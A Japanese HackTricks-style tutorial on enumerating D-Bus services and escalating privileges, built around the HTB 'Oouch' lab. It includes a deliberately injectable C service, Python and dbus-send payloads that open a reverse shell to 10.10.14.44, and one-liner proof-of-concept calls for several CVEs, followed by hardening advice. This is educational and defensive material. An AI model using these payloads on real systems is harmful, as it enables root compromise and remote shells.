# D-Busの列挙とコマンドインジェクションによる特権昇格

{{#include ../../banners/hacktricks-training.md}}

## **GUI列挙**

D-Busは、Ubuntuデスクトップ環境におけるプロセス間通信（IPC）の仲介者として利用されています。Ubuntuでは、いくつかのメッセージバスが同時に動作しているのが観察されます：主に**特権サービスがシステム全体に関連するサービスを公開するために利用するシステムバス**と、各ログインユーザーのためのセッションバスです。このセッションバスは、その特定のユーザーにのみ関連するサービスを公開します。ここでは、特権を昇格させることを目的としているため、主にシステムバスに焦点を当てています。D-Busのアーキテクチャは、各セッションバスごとに「ルーター」を採用しており、クライアントが通信したいサービスのために指定したアドレスに基づいて、クライアントメッセージを適切なサービスにリダイレクトする役割を担っています。

D-Bus上のサービスは、公開される**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準的なOOP言語におけるクラスインスタンスに似ており、各インスタンスは**オブジェクトパス**によって一意に識別されます。このパスは、ファイルシステムパスに似ており、サービスによって公開される各オブジェクトを一意に識別します。研究目的での重要なインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースであり、単一のメソッドIntrospectを特徴としています。このメソッドは、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返しますが、ここではプロパティとシグナルを省略し、メソッドに焦点を当てています。

D-Busインターフェースとの通信には、2つのツールが使用されました：D-Busによって公開されるメソッドをスクリプトで簡単に呼び出すためのCLIツール**gdbus**と、各バスで利用可能なサービスを列挙し、各サービスに含まれるオブジェクトを表示するために設計されたPythonベースのGUIツール[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)です。
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

最初の画像には、D-Busシステムバスに登録されたサービスが表示されており、**org.debin.apt**がシステムバスボタンを選択した後に特に強調されています。D-Feetはこのサービスに対してオブジェクトをクエリし、選択したオブジェクトのインターフェース、メソッド、プロパティ、およびシグナルを表示します。これが2番目の画像で確認できます。各メソッドのシグネチャも詳細に記載されています。

注目すべき特徴は、サービスの**プロセスID（pid）**と**コマンドライン**が表示されることで、サービスが昇格した特権で実行されているかどうかを確認するのに役立ちます。これは研究の関連性にとって重要です。

**D-Feetはメソッドの呼び出しも可能です**：ユーザーはパラメータとしてPython式を入力でき、D-FeetはそれをD-Busタイプに変換してサービスに渡します。

ただし、**一部のメソッドは認証を必要とします**。これらのメソッドは無視します。なぜなら、私たちの目標は最初から資格情報なしで特権を昇格させることだからです。

また、一部のサービスは、ユーザーが特定のアクションを実行することを許可されるべきかどうかを確認するために、別のD-Busサービスであるorg.freedeskto.PolicyKit1にクエリを送信することに注意してください。

## **Cmd line Enumeration**

### サービスオブジェクトのリスト

開いているD-Busインターフェースをリストすることが可能です：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### 接続

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) プロセスがバスへの接続を設定すると、バスはその接続に _ユニーク接続名_ と呼ばれる特別なバス名を割り当てます。このタイプのバス名は不変であり、接続が存在する限り変更されないことが保証されています。さらに重要なことに、バスの寿命中に再利用することはできません。これは、同じプロセスがバスへの接続を閉じて新しい接続を作成しても、そのバスへの他の接続にそのようなユニーク接続名が割り当てられることは決してないことを意味します。ユニーク接続名は、禁止されているコロン文字で始まるため、簡単に認識できます。

### サービスオブジェクト情報

次に、インターフェースに関する情報を取得できます:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### サービスオブジェクトのインターフェースをリストする

十分な権限が必要です。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### サービスオブジェクトのインターフェースを調査する

この例では、`tree`パラメーターを使用して発見された最新のインターフェースが選択されたことに注意してください（_前のセクションを参照_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
注意してください、インターフェース `htb.oouch.Block` のメソッド `.Block`（私たちが興味を持っているもの）。他の列の "s" は、文字列を期待していることを意味するかもしれません。

### モニター/キャプチャインターフェース

十分な権限があれば（`send_destination` と `receive_sender` の権限だけでは不十分です）、**D-Bus通信をモニター**できます。

**通信をモニター**するには、**root**である必要があります。まだrootで問題がある場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

> [!WARNING]
> D-Busの設定ファイルを構成して**非rootユーザーが通信をスニッフィングできるようにする**方法を知っている場合は、**私に連絡してください**！

モニターするための異なる方法：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
次の例では、インターフェース `htb.oouch.Block` が監視されており、**メッセージ "**_**lalalalal**_**" が誤通信を通じて送信されます**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`capture`の代わりに`monitor`を使用して、結果をpcapファイルに保存できます。

#### ノイズをすべてフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上に情報が多すぎる場合は、次のようにマッチルールを渡します:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定できます。メッセージが_いずれか_のルールに一致する場合、そのメッセージが印刷されます。次のように:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
D-Busの構文ルールに関する詳細は、[D-Busドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html)を参照してください。

### さらに

`busctl`にはさらに多くのオプションがあります。[**すべてはこちらで見つけてください**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **脆弱なシナリオ**

ユーザー**qtc inside the host "oouch" from HTB**として、_ /etc/dbus-1/system.d/htb.oouch.Block.conf _にある**予期しないD-Bus設定ファイル**を見つけることができます。
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定から、**このD-BUS通信を介して情報を送受信するには、`root`または`www-data`ユーザーである必要があります**。

Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_にいくつかのdbus関連のコードがあります。これが興味深いコードです：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
ご覧のとおり、**D-Busインターフェースに接続**し、**「Block」関数**に「client_ip」を送信しています。

D-Bus接続の反対側には、Cでコンパイルされたバイナリが実行されています。このコードは、D-Bus接続で**IPアドレスをリッスン**し、与えられたIPアドレスをブロックするために`system`関数を介してiptablesを呼び出しています。\
**`system`への呼び出しは意図的にコマンドインジェクションに対して脆弱であり**、次のようなペイロードがリバースシェルを作成します: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### これを悪用する

このページの最後に、**D-Busアプリケーションの完全なCコード**があります。その中には、91行目から97行目の間に**`D-Busオブジェクトパス`**と**`インターフェース名`**が**登録されている**方法があります。この情報は、D-Bus接続に情報を送信するために必要です:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目には**このD-Bus通信に登録されている唯一のメソッド**が`Block`と呼ばれていることがわかります（_**そのため、次のセクションではペイロードがサービスオブジェクト`htb.oouch.Block`、インターフェース`/htb/oouch/Block`、およびメソッド名`Block`に送信されます**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

次のPythonコードは、`block_iface.Block(runme)`を介して`Block`メソッドにペイロードをD-Bus接続に送信します（_これは前のコードのチャンクから抽出されたことに注意してください_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl と dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` は「Message Bus」にメッセージを送信するためのツールです。
- Message Bus – システムがアプリケーション間の通信を容易にするために使用するソフトウェアです。これはメッセージキューに関連しています（メッセージは順序通りに並べられます）が、Message Busではメッセージがサブスクリプションモデルで送信され、非常に迅速です。
- “-system” タグは、セッションメッセージではなくシステムメッセージであることを示すために使用されます（デフォルト）。
- “–print-reply” タグは、メッセージを適切に印刷し、人間が読みやすい形式で返信を受け取るために使用されます。
- “–dest=Dbus-Interface-Block” Dbusインターフェースのアドレスです。
- “–string:” – インターフェースに送信したいメッセージのタイプです。メッセージを送信するための形式には、ダブル、バイト、ブール値、整数、objpathなどがあります。この中で、「オブジェクトパス」は、ファイルのパスをDbusインターフェースに送信したいときに便利です。この場合、特別なファイル（FIFO）を使用して、ファイルの名前でインターフェースにコマンドを渡すことができます。“string:;” – これは、FIFOリバースシェルファイル/コマンドの場所を置くためにオブジェクトパスを再度呼び出すためのものです。

_`htb.oouch.Block.Block` の最初の部分（`htb.oouch.Block`）はサービスオブジェクトを参照し、最後の部分（`.Block`）はメソッド名を参照します。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## 自動列挙ヘルパー (2023-2025)

`busctl`/`gdbus`を使用して大規模なD-Bus攻撃面を手動で列挙するのは迅速に苦痛になります。最近数年でリリースされた2つの小さなFOSSユーティリティは、レッドチームやCTFの活動中に物事を加速させることができます：

### dbusmap ("D-BusのNmap")
* 著者: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Cで書かれた単一の静的バイナリ（<50 kB）で、すべてのオブジェクトパスを歩き、`Introspect` XMLを取得し、所有するPID/UIDにマッピングします。
* 有用なフラグ:
```bash
# *system*バス上のすべてのサービスをリストし、呼び出し可能なすべてのメソッドをダンプ
sudo dbus-map --dump-methods

# Polkitプロンプトなしで到達可能なメソッド/プロパティを積極的にプローブ
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* ツールは、保護されていないよく知られた名前を`!`でマークし、*所有*（引き継ぎ）できるサービスや、特権のないシェルから到達可能なメソッド呼び出しを即座に明らかにします。

### uptux.py
* 著者: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* systemdユニット内の*書き込み可能*なパスと、過剰に許可されたD-Busポリシーファイル（例: `send_destination="*"`）を探すPython専用スクリプトです。
* 簡単な使用法:
```bash
python3 uptux.py -n          # すべてのチェックを実行するが、ログファイルは作成しない
python3 uptux.py -d          # 詳細なデバッグ出力を有効にする
```
* D-Busモジュールは以下のディレクトリを検索し、通常のユーザーによって偽装またはハイジャック可能なサービスを強調表示します：
* `/etc/dbus-1/system.d/` および `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/`（ベンダーのオーバーライド）

---

## 注目すべきD-Bus特権昇格バグ (2024-2025)

最近公開されたCVEを注視することで、カスタムコード内の類似の不安全なパターンを見つけるのに役立ちます。以下の高影響のローカルEoP問題はすべて、**system bus**上の認証/認可の欠如から生じています：

| 年 | CVE | コンポーネント | 根本原因 | ワンライナーPoC |
|------|-----|-----------|------------|---------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HIDデーモン) | `logid`システムサービスは、*任意*のユーザーがデバイスプロファイルを変更し、マクロ文字列を介して任意のシェルコマンドを注入できる制限のない`org.freedesktop.Logiopsd`インターフェースを公開しています。 | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | ルートで実行されるプロキシが、呼び出し元のUID/Polkitコンテキストを転送せずにレガシーバス名をバックエンドサービスに転送するため、すべての転送リクエストはUID 0として扱われます。 | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | 公開された`Dispatch`メソッドにはACLが欠如しているため、攻撃者は*パッケージマネージャ*ワーカーに任意のRPMをインストールさせることができます。 | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |

注意すべきパターン：
1. サービスが**system bus上でrootとして実行される**。
2. PolicyKitチェックがない（またはプロキシによってバイパスされている）。
3. メソッドが最終的に`system()`/パッケージのインストール/デバイスの再構成につながる → コード実行。

`dbusmap --enable-probes`または手動の`busctl call`を使用して、パッチが適切な`polkit_authority_check_authorization()`ロジックをバックポートしているか確認します。

---

## ハードニング & 検出のクイックウィン

* 世界書き込み可能または*送信/受信*オープンポリシーを検索：
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 危険なメソッドにはPolkitを要求する – *root*プロキシでさえ、独自のPIDではなく*呼び出し元*PIDを`polkit_authority_check_authorization_sync()`に渡すべきです。
* 長時間実行されるヘルパーで特権をドロップする（バスに接続した後に`sd_pid_get_owner_uid()`を使用して名前空間を切り替える）。
* サービスを削除できない場合は、少なくとも*スコープ*を専用のUnixグループに制限し、そのXMLポリシーでアクセスを制限します。
* ブルーチーム：`busctl capture --output=/var/log/dbus_$(date +%F).pcap`を使用してシステムバスの永続的なキャプチャを有効にし、Wiresharkにインポートして異常検出を行います。

---

## 参考文献

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)


- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{{#include ../../banners/hacktricks-training.md}}
